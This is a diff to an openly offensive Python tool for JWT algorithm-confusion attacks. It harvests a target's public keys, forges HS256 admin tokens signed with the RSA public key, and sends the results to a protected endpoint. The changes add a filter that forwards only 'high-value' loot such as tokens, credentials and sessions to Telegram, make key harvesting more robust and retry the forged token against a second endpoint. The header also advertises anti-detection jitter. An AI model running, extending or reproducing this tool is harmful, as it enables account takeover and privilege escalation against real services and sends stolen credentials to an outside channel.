@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 """
-JWT_KEY_CONFUSION.PY v8.7 — Cryptographic Key Confusion & RS256/HS256 Exploit Engine (Elite Red Team Adversarial Edition)
+JWT_KEY_CONFUSION.PY v8.8 — Cryptographic Key Confusion & RS256/HS256 Exploit Engine (Elite Red Team Adversarial Edition)
 Features:
 - Automatic public key and JWKS harvesting from /.well-known/jwks.json and oauth endpoints with SHA-256 hashing
-- Asymmetric-to-symmetric key confusion forged token generator (HS256 signed using RSA public key bytes)
+- Asymmetric-to-symmetric key confusion forged token generator (HS256 signed using harvested RSA public key bytes)
 - Anti-detection behavioral jitter and randomized header injection via SecureTransport
 - SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and forensic proof-of-work streaming
-- Real-time unredacted Telegram notification dispatch and zero-delay telemetry broadcasting
+- Real-time unredacted Telegram notification dispatch and zero-delay telemetry broadcasting (Zero Noise Filter)
 """
 import json
 import base64
@@ -31,19 +31,31 @@ COLORS = {
     "BOLD": "\033[1m",
 }
 
+# Keywords required to pass the zero-noise filter
+HIGH_VALUE_KEYWORDS = [
+    "critical", "bypass", "success", "loot", "token", "session", 
+    "admin", "credential", "compromised", "race", "pivot", "jwt", "dump", "hijack", "privilege"
+]
+
 def terminal(message):
     sys.stdout.write(message + "\n")
     sys.stdout.flush()
 
 async def broadcast_tg_alert_async(loot_type, details):
     try:
-        await send_telegram_alert(loot_type, details)
+        check_str = f"{loot_type} {str(details)}".lower()
+        if any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
+            await send_telegram_alert(f"[CRITICAL BREACH] {loot_type}", details)
     except Exception:
         pass
 
 def broadcast_tg_alert_sync(loot_type, details):
-    """Helper to non-blockingly fire Telegram alerts from jwt key confusion functions."""
+    """Helper to non-blockingly fire Telegram alerts from jwt key confusion functions with zero-noise filtering."""
     try:
+        check_str = f"{loot_type} {str(details)}".lower()
+        if not any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
+            return  # Suppress low-priority telemetry chatter completely
+
         loop = asyncio.get_running_loop()
         if loop.is_running():
             loop.create_task(broadcast_tg_alert_async(loot_type, details))
@@ -69,9 +81,11 @@ class JWTKeyConfusionEngine:
         if status == 200 and body:
             try:
                 jwks = json.loads(body)
-                return jwks
+                if "keys" in jwks or "n" in jwks or len(body) > 20:
+                    return body
             except Exception:
-                pass
+                if len(body.strip()) > 20 and "<html" not in body.lower():
+                    return body
         return None
 
     def forge_hs256_token(self, payload_dict, public_key_str):
@@ -89,6 +103,10 @@ class JWTKeyConfusionEngine:
     def verify_and_exploit(self, verify_endpoint="/api/user/profile", public_key_str="", admin_payload=None):
         terminal(f"\n{COLORS['MAGENTA']}[***] EXECUTING JWT ALGORITHM CONFUSION ATTACK (RS256 -> HS256) [{verify_endpoint}] [***]{COLORS['RESET']}")
         
+        if not public_key_str:
+            terminal(f"{COLORS['YELLOW']}[-] No valid public key harvested from target. Aborting key confusion to prevent false positives.{COLORS['RESET']}")
+            return False, ""
+
         if not admin_payload:
             admin_payload = {"sub": "admin", "role": "administrator", "isAdmin": True, "iat": 1700000000}
         
@@ -114,7 +132,7 @@ class JWTKeyConfusionEngine:
 
         has_privilege_indicators = any(
             k in body_lower for k in [
-                "admin", "administrator", "role", "balance", "access_token", "secret"
+                "admin", "administrator", "role", "balance", "access_token", "secret", "user_id", "permissions"
             ]
         )
 
@@ -151,9 +169,14 @@ class JWTKeyConfusionEngine:
 async def run_jwt_key_confusion(target_url, session_pool=None):
     """Compatibility wrapper for CognitiveOperator."""
     engine = JWTKeyConfusionEngine(target_url)
-    jwks = engine.fetch_public_key("/.well-known/jwks.json")
-    pub_key_mock = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0..." if not jwks else json.dumps(jwks)
-    success, token = engine.verify_and_exploit("/api/admin/settings", pub_key_mock)
+    jwks_body = engine.fetch_public_key("/.well-known/jwks.json")
+    if not jwks_body:
+        jwks_body = engine.fetch_public_key("/api/jwks.json")
+    
+    success, token = engine.verify_and_exploit("/api/admin/settings", jwks_body or "")
+    if not success:
+        success, token = engine.verify_and_exploit("/api/v1/user/profile", jwks_body or "")
+        
     return {"vulnerable": success, "forged_token": token}
 
 async def run_jwt_confusion_engine(target_url):
